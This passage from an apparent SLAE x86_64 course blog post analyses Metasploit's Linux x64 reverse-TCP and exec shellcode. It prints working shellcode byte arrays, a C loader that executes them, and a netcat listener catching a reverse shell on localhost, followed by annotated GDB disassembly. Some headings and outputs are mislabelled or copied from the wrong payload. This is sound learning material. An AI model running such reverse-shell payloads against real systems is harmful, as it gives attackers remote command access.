</span></span><span style="display:flex;"><span><span style="color:#f92672">=========================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       Name: Linux Command Shell, Reverse TCP Inline
</span></span><span style="display:flex;"><span>     Module: payload/linux/x64/shell_reverse_tcp
</span></span><span style="display:flex;"><span>   Platform: Linux
</span></span><span style="display:flex;"><span>       Arch: x64
</span></span><span style="display:flex;"><span>Needs Admin: No
</span></span><span style="display:flex;"><span> Total size: <span style="color:#ae81ff">74</span>
</span></span><span style="display:flex;"><span>       Rank: Normal
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Provided by:
</span></span><span style="display:flex;"><span>    ricky
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Basic options:
</span></span><span style="display:flex;"><span>Name   Current Setting  Required  Description
</span></span><span style="display:flex;"><span>----   ---------------  --------  -----------
</span></span><span style="display:flex;"><span>LHOST                   yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port
</span></span></code></pre></div><p>Let&rsquo;s get our bind shell using <code>msfvenom</code>. The command below will by default point to 127.0.0.1 and port 4444.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>$ msfvenom -p linux/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;127.1.1.1&#39;</span> -f c
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">74</span> bytes
</span></span><span style="display:flex;"><span>unsigned char shellcode<span style="color:#f92672">[]</span> <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xb9\x02\x00\x11\x5c\x7f\x01\x01\x01\x51\x48\x89\xe6\x6a\x10&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&#34;</span>;
</span></span></code></pre></div><h3 id="compile-and-testing-the-shellcode-1">Compile and Testing the Shellcode<a hidden class="anchor" aria-hidden="true" href="#compile-and-testing-the-shellcode-1">#</a></h3>
<p>Adding the shellcode to our tester program - <code>shellcode.c</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span> \
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x52\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6a\x31\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0f\x05</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Shellcode Length: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strlen</span>(code));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>ret)() <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>(<span style="color:#f92672">*</span>)())code;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ret</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Compiling with <code>gcc</code> and executing it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/shell_reverse-tcp ‹main●› 
</span></span><span style="display:flex;"><span>╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
</span></span><span style="display:flex;"><span>shellcode.c:12:1: warning: <span style="color:#66d9ef">return</span> type defaults to ‘int’ <span style="color:#f92672">[</span>-Wimplicit-int<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span> main<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span> ^~~~
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/shell_reverse-tcp ‹main●› 
</span></span><span style="display:flex;"><span>╰─$ ./shellcode 
</span></span><span style="display:flex;"><span>Shellcode Length: <span style="color:#ae81ff">17</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>----------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/1-shell-bind-tcp-password-shellcode ‹main●› 
</span></span><span style="display:flex;"><span>╰─$ nc -lvnp <span style="color:#ae81ff">4444</span>                                                                                    <span style="color:#ae81ff">1</span> ↵
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>127.1.1.1<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span> <span style="color:#ae81ff">44176</span>
</span></span><span style="display:flex;"><span>whoami
</span></span><span style="display:flex;"><span>edu
</span></span></code></pre></div><h3 id="gdb-analysis-1">GDB Analysis<a hidden class="anchor" aria-hidden="true" href="#gdb-analysis-1">#</a></h3>
<p>For this analysis I used <a href="https://github.com/hugsy/gef">GEF</a> plugin to assist my analysis with <code>GDB</code>.</p>
<pre tabindex="0"><code>gdb -q ./shellcode
</code></pre><p>First, we put a breakpoint in <code>code[]</code> to pause the execution at the beggining of the shellcode.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/shell_reverse-tcp ‹main●› 
</span></span><span style="display:flex;"><span>╰─$ gdb -q shellcode
</span></span><span style="display:flex;"><span>GEF <span style="color:#66d9ef">for</span> linux ready, type <span style="color:#e6db74">`</span>gef<span style="color:#e6db74">&#39; to start, `gef config&#39;</span> to configure
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77</span> commands loaded <span style="color:#66d9ef">for</span> GDB 8.2.1 using Python engine 3.7
</span></span><span style="display:flex;"><span>gef➤  b *&amp;code
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> at 0x4060
</span></span><span style="display:flex;"><span>gef➤  r
</span></span></code></pre></div><p>We go direct to the shellcode&rsquo;s first instruction.</p>
<h4 id="disassembling-reverse-tcp-shellcode">Disassembling Reverse TCP Shellcode<a hidden class="anchor" aria-hidden="true" href="#disassembling-reverse-tcp-shellcode">#</a></h4>
<p>With the instruction <code>disas</code> we can disassemble the <code>code</code> function. In our context is the Bind Shellcode.</p>
<pre tabindex="0"><code>gef➤  disas
Dump of assembler code for function code:
=&gt; 0x0000555555558060 &lt;+0&gt;:     push   0x29
   0x0000555555558062 &lt;+2&gt;:     pop    rax
   0x0000555555558063 &lt;+3&gt;:     cdq    
   0x0000555555558064 &lt;+4&gt;:     push   0x2
   0x0000555555558066 &lt;+6&gt;:     pop    rdi
   0x0000555555558067 &lt;+7&gt;:     push   0x1
   0x0000555555558069 &lt;+9&gt;:     pop    rsi
   0x000055555555806a &lt;+10&gt;:    syscall 
   0x000055555555806c &lt;+12&gt;:    xchg   rdi,rax
   0x000055555555806e &lt;+14&gt;:    movabs rcx,0x101017f5c110002
   0x0000555555558078 &lt;+24&gt;:    push   rcx
   0x0000555555558079 &lt;+25&gt;:    mov    rsi,rsp
   0x000055555555807c &lt;+28&gt;:    push   0x10
   0x000055555555807e &lt;+30&gt;:    pop    rdx
   0x000055555555807f &lt;+31&gt;:    push   0x2a
   0x0000555555558081 &lt;+33&gt;:    pop    rax
   0x0000555555558082 &lt;+34&gt;:    syscall 
   0x0000555555558084 &lt;+36&gt;:    push   0x3
   0x0000555555558086 &lt;+38&gt;:    pop    rsi
   0x0000555555558087 &lt;+39&gt;:    dec    rsi
   0x000055555555808a &lt;+42&gt;:    push   0x21
   0x000055555555808c &lt;+44&gt;:    pop    rax
   0x000055555555808d &lt;+45&gt;:    syscall 
   0x000055555555808f &lt;+47&gt;:    jne    0x555555558087 &lt;code+39&gt;
   0x0000555555558091 &lt;+49&gt;:    push   0x3b
   0x0000555555558093 &lt;+51&gt;:    pop    rax
   0x0000555555558094 &lt;+52&gt;:    cdq    
   0x0000555555558095 &lt;+53&gt;:    movabs rbx,0x68732f6e69622f
   0x000055555555809f &lt;+63&gt;:    push   rbx
   0x00005555555580a0 &lt;+64&gt;:    mov    rdi,rsp
   0x00005555555580a3 &lt;+67&gt;:    push   rdx
   0x00005555555580a4 &lt;+68&gt;:    push   rdi
   0x00005555555580a5 &lt;+69&gt;:    mov    rsi,rsp
   0x00005555555580a8 &lt;+72&gt;:    syscall 
   0x00005555555580aa &lt;+74&gt;:    add    BYTE PTR [rax],al
End of assembler dump.
</code></pre><h5 id="socket-syscall-1">Socket Syscall<a hidden class="anchor" aria-hidden="true" href="#socket-syscall-1">#</a></h5>
<pre tabindex="0"><code>0x0000555555558040 &lt;+0&gt;:     push   0x29
0x0000555555558042 &lt;+2&gt;:     pop    rax
0x0000555555558043 &lt;+3&gt;:     cdq    
0x0000555555558044 &lt;+4&gt;:     push   0x2
0x0000555555558046 &lt;+6&gt;:     pop    rdi
0x0000555555558047 &lt;+7&gt;:     push   0x1
0x0000555555558049 &lt;+9&gt;:     pop    rsi
0x000055555555804a &lt;+10&gt;:    syscall 
</code></pre><ul>
<li>
<p><code>rax</code> is set to <code>0x29</code> which is the <code>socket</code> syscall number.</p>
</li>
<li>
<p><code>cdq</code> sets <code>rdx</code> to null.</p>
</li>
<li>
<p><code>rdi</code> is set to 0x2 which is <code>AF_INET</code>.</p>
</li>
<li>
<p><code>rsi</code> is set to 0x1 which is SOCK_STREAM</p>
</li>
</ul>
<h5 id="connect-syscall">Connect Syscall<a hidden class="anchor" aria-hidden="true" href="#connect-syscall">#</a></h5>
<p>Below the struct for the socket address.</p>
<pre tabindex="0"><code>0x000055555555804c &lt;+12&gt;:    xchg   rdi,rax ; stores socket file descriptor in rdi
0x000055555555806e &lt;+14&gt;:    movabs rcx,0x101017f5c110002
0x0000555555558078 &lt;+24&gt;:    push   rcx
0x0000555555558079 &lt;+25&gt;:    mov    rsi,rsp
0x000055555555807c &lt;+28&gt;:    push   0x10
0x000055555555807e &lt;+30&gt;:    pop    rdx
0x000055555555807f &lt;+31&gt;:    push   0x2a
0x0000555555558081 &lt;+33&gt;:    pop    rax
0x0000555555558082 &lt;+34&gt;:    syscall
</code></pre><ul>
<li>Puts <code>0x101017f5c110002</code> in <code>rcx</code> and passes the struct pointer to <code>rsi</code>
<ul>
<li>0002 is <code>AF_INET</code></li>
<li>5c11 if for PORT 4444 in Little-Endian format</li>
<li><code>101017f</code> if the IP address <code>127.0.0.1</code></li>
</ul>
</li>
</ul>
<p>Then puts 0x10 (16 bytes) in <code>rdx</code> which is the struct size</p>
<ul>
<li><code>0x2a</code> is connect syscall number.</li>
</ul>
<h5 id="dup2-syscall-loop-1">Dup2 Syscall Loop<a hidden class="anchor" aria-hidden="true" href="#dup2-syscall-loop-1">#</a></h5>
<pre tabindex="0"><code>0x0000555555558070 &lt;+48&gt;:    push   0x3
0x0000555555558072 &lt;+50&gt;:    pop    rsi
0x0000555555558073 &lt;+51&gt;:    dec    rsi
0x0000555555558076 &lt;+54&gt;:    push   0x21
0x0000555555558078 &lt;+56&gt;:    pop    rax
0x0000555555558079 &lt;+57&gt;:    syscall 
0x000055555555807b &lt;+59&gt;:    jne    0x555555558073 &lt;code+51&gt;
</code></pre><p>The already &ldquo;famous&rdquo; dup2 syscall loop for <code>stdin</code>, <code>stdout</code> and <code>stderr</code>.</p>
<p>Puts <code>0x21</code>, the dup2 syscall number in <code>rax</code></p>
<h5 id="execve-syscall-1">Execve Syscall<a hidden class="anchor" aria-hidden="true" href="#execve-syscall-1">#</a></h5>
<p>The syscall used to call <code>/bin/sh</code> and spawn a shell to an incoming connection.</p>
<pre tabindex="0"><code>0x000055555555807d &lt;+61&gt;:    push   0x3b
0x000055555555807f &lt;+63&gt;:    pop    rax
0x0000555555558080 &lt;+64&gt;:    cdq 
</code></pre><ul>
<li>set <code>rax</code> with execve syscall</li>
<li><code>cdq</code> clears <code>rdx</code></li>
</ul>
<pre tabindex="0"><code>0x0000555555558081 &lt;+65&gt;:    movabs rbx,0x68732f6e69622f    ; /bin/sh
0x000055555555808b &lt;+75&gt;:    push   rbx     ; push null
0x000055555555808c &lt;+76&gt;:    mov    rdi,rsp
</code></pre><ul>
<li><code>rdi</code> is set to the memory address of the null-terminated string <code>/bin/sh</code></li>
</ul>
<pre tabindex="0"><code>0x000055555555808f &lt;+79&gt;:    push   rdx     ; push null
0x0000555555558090 &lt;+80&gt;:    push   rdi     ; push memory of /bin/sh
0x0000555555558091 &lt;+81&gt;:    mov    rsi,rsp
0x0000555555558094 &lt;+84&gt;:    syscall 
</code></pre><ul>
<li><code>rsi</code> is set to a pointer of a pointer address of <code>/bin/sh</code></li>
<li>Calls execve with the <code>syscall</code> instruction</li>
</ul>
<h2 id="shellcode-3---linuxx64exec">Shellcode 3 - linux/x64/exec<a hidden class="anchor" aria-hidden="true" href="#shellcode-3---linuxx64exec">#</a></h2>
<hr>
<p>The first step to do is generate the shellcode using MSF. As usual, let&rsquo;s check its arguments</p>
<p><code>msfvenom -p linux/x64/exec --list-options</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>$ msfvenom -p linux/x64/shell_reverse_tcp --list-options
</span></span><span style="display:flex;"><span>Options <span style="color:#66d9ef">for</span> payload/linux/x64/shell_reverse_tcp:
</span></span><span style="display:flex;"><span><span style="color:#f92672">=========================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       Name: Linux Command Shell, Reverse TCP Inline
</span></span><span style="display:flex;"><span>     Module: payload/linux/x64/shell_reverse_tcp
</span></span><span style="display:flex;"><span>   Platform: Linux
</span></span><span style="display:flex;"><span>       Arch: x64
</span></span><span style="display:flex;"><span>Needs Admin: No
</span></span><span style="display:flex;"><span> Total size: <span style="color:#ae81ff">74</span>
</span></span><span style="display:flex;"><span>       Rank: Normal
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Provided by:
</span></span><span style="display:flex;"><span>    ricky
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Basic options:
</span></span><span style="display:flex;"><span>Name   Current Setting  Required  Description
</span></span><span style="display:flex;"><span>----   ---------------  --------  -----------
</span></span><span style="display:flex;"><span>LHOST                   yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Description:
</span></span><span style="display:flex;"><span>  Connect back to attacker and spawn a command shell
</span></span></code></pre></div><p>Let&rsquo;s get our bind shell using <code>msfvenom</code>. The command below will by default point to 127.0.0.1 and port 4444.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>$ msfvenom -p linux/x64/exec CMD<span style="color:#f92672">=</span>whoami -f c
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">43</span> bytes
</span></span><span style="display:flex;"><span>Final size of c file: <span style="color:#ae81ff">208</span> bytes
</span></span><span style="display:flex;"><span>unsigned char buf<span style="color:#f92672">[]</span> <span style="color:#f92672">=</span> 
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x07\x00\x00\x00\x77&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x68\x6f\x61\x6d\x69\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x05&#34;</span>;
</span></span></code></pre></div><h2 id="compile-and-testing-the-shellcode-2">Compile and Testing the Shellcode<a hidden class="anchor" aria-hidden="true" href="#compile-and-testing-the-shellcode-2">#</a></h2>
<p>Adding the shellcode to our tester program - <code>shellcode.c</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span> \
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x07\x00\x00\x00\x77</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68\x6f\x61\x6d\x69\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x05</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Shellcode Length: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strlen</span>(code));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>ret)() <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>(<span style="color:#f92672">*</span>)())code;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ret</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Compiling with <code>gcc</code> and executing it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/exec ‹main●› 
</span></span><span style="display:flex;"><span>╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c                                                                                                              <span style="color:#ae81ff">130</span> ↵
</span></span><span style="display:flex;"><span>shellcode.c:11:1: warning: <span style="color:#66d9ef">return</span> type defaults to ‘int’ <span style="color:#f92672">[</span>-Wimplicit-int<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span> main<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span> ^~~~
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/exec ‹main●› 
</span></span><span style="display:flex;"><span>╰─$ ./shellcode 
</span></span><span style="display:flex;"><span>Shellcode Length: <span style="color:#ae81ff">9</span>
</span></span><span style="display:flex;"><span>edu
</span></span></code></pre></div><h3 id="gdb-analysis-2">GDB Analysis<a hidden class="anchor" aria-hidden="true" href="#gdb-analysis-2">#</a></h3>
<p>For this analysis I used <a href="https://github.com/hugsy/gef">GEF</a> plugin to assist my analysis with <code>GDB</code>.</p>
<pre tabindex="0"><code>gdb -q ./shellcode
</code></pre><p>First, we put a breakpoint in <code>code[]</code> to pause the execution at the beggining of the shellcode.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/exec ‹main●› 
</span></span><span style="display:flex;"><span>╰─$ gdb -q shellcode
</span></span><span style="display:flex;"><span>GEF <span style="color:#66d9ef">for</span> linux ready, type <span style="color:#e6db74">`</span>gef<span style="color:#e6db74">&#39; to start, `gef config&#39;</span> to configure
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77</span> commands loaded <span style="color:#66d9ef">for</span> GDB 8.2.1 using Python engine 3.7
</span></span><span style="display:flex;"><span>gef➤  b *&amp;code
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> at 0x4060
</span></span><span style="display:flex;"><span>gef➤  r
</span></span></code></pre></div><p>We go direct to the shellcode&rsquo;s first instruction.</p>
<h4 id="disassembling-reverse-tcp-shellcode-1">Disassembling Reverse TCP Shellcode<a hidden class="anchor" aria-hidden="true" href="#disassembling-reverse-tcp-shellcode-1">#</a></h4>
<p>With the instruction <code>disas</code> we can disassemble the <code>code</code> function. In our context is the exec Shellcode.</p>
<h4 id="disassembling-reverse-tcp-shellcode-2">Disassembling Reverse TCP Shellcode<a hidden class="anchor" aria-hidden="true" href="#disassembling-reverse-tcp-shellcode-2">#</a></h4>
<pre tabindex="0"><code>gef➤  disas
Dump of assembler code for function code:
=&gt; 0x0000555555558060 &lt;+0&gt;:     movabs rax,0x68732f6e69622f
   0x000055555555806a &lt;+10&gt;:    cdq    
   0x000055555555806b &lt;+11&gt;:    push   rax
   0x000055555555806c &lt;+12&gt;:    push   rsp
   0x000055555555806d &lt;+13&gt;:    pop    rdi
   0x000055555555806e &lt;+14&gt;:    push   rdx
   0x000055555555806f &lt;+15&gt;:    pushw  0x632d
   0x0000555555558073 &lt;+19&gt;:    push   rsp
   0x0000555555558074 &lt;+20&gt;:    pop    rsi
   0x0000555555558075 &lt;+21&gt;:    push   rdx
   0x0000555555558076 &lt;+22&gt;:    call   0x555555558082 &lt;code+34&gt;
   0x000055555555807b &lt;+27&gt;:    ja     0x5555555580e5
   0x000055555555807d &lt;+29&gt;:    outs   dx,DWORD PTR ds:[rsi]
   0x000055555555807e &lt;+30&gt;:    (bad)  
   0x000055555555807f &lt;+31&gt;:    ins    DWORD PTR es:[rdi],dx
   0x0000555555558080 &lt;+32&gt;:    imul   eax,DWORD PTR [rax],0x5e545756
   0x0000555555558086 &lt;+38&gt;:    push   0x3b
   0x0000555555558088 &lt;+40&gt;:    pop    rax
   0x0000555555558089 &lt;+41&gt;:    syscall 
   0x000055555555808b &lt;+43&gt;:    add    BYTE PTR [rax],al
End of assembler dump.
</code></pre><h4 id="binsh-push-push-and-push-to-the-stack">/bin/sh? Push, push and push to the stack!<a hidden class="anchor" aria-hidden="true" href="#binsh-push-push-and-push-to-the-stack">#</a></h4>
<pre tabindex="0"><code>0x0000555555558060 &lt;+0&gt;:     movabs rax,0x68732f6e69622f    ; /bin/sh
0x000055555555806a &lt;+10&gt;:    cdq    
0x000055555555806b &lt;+11&gt;:    push   rax
0x000055555555806c &lt;+12&gt;:    push   rsp
0x000055555555806d &lt;+13&gt;:    pop    rdi
</code></pre><ul>
<li><code>/bin/sh</code> moved to <code>rax</code> and pushed to the stack.</li>
<li><code>cdq</code> zeroes <code>rdx</code>.</li>
<li>pushed a pointer of a pointer to <code>/binsh</code> with <code>push rsp</code> and poped to <code>rdi</code>. It holds a pointer to the command to be executed.</li>
</ul>
<h4 id="command-flag--c">Command Flag (-c)<a hidden class="anchor" aria-hidden="true" href="#command-flag--c">#</a></h4>
<pre tabindex="0"><code>0x000055555555806e &lt;+14&gt;:    push   rdx
0x000055555555806f &lt;+15&gt;:    pushw  0x632d  ; -c
0x0000555555558073 &lt;+19&gt;:    push   rsp
0x0000555555558074 &lt;+20&gt;:    pop    rsi
</code></pre><ul>
<li><code>push rdx</code> null terminates <code>-c</code> string.</li>
<li><code>rdi</code> points to <code>-c</code></li>
</ul>
<h4 id="obfudcated-call-push-pop-syscall-calling-execve-in-a-different-way">Obfudcated &ldquo;Call-Push-Pop&rdquo; Syscall? Calling execve in a different way<a hidden class="anchor" aria-hidden="true" href="#obfudcated-call-push-pop-syscall-calling-execve-in-a-different-way">#</a></h4>
<pre tabindex="0"><code>0x0000555555558076 &lt;+22&gt;:    call   0x555555558082 &lt;code+34&gt;
0x000055555555807b &lt;+27&gt;:    ja     0x5555555580e5
[...]
0x0000555555558080 &lt;+32&gt;:    imul   eax,DWORD PTR [rax],0x5e545756  ; redirected to the &#34;middle&#34;
0x555555558086 &lt;code+38&gt;:    push   0x3b
0x555555558088 &lt;code+40&gt;:    pop    rax
0x555555558089 &lt;code+41&gt;:    syscall 
</code></pre><p>Here we have a <code>deja vú</code> of the <a href="/posts/slae32/slae_32_assignment_5/#shellcode-2---linuxx86exec">SLAE32 MSF Shellcode Analysis</a> assignment.</p>
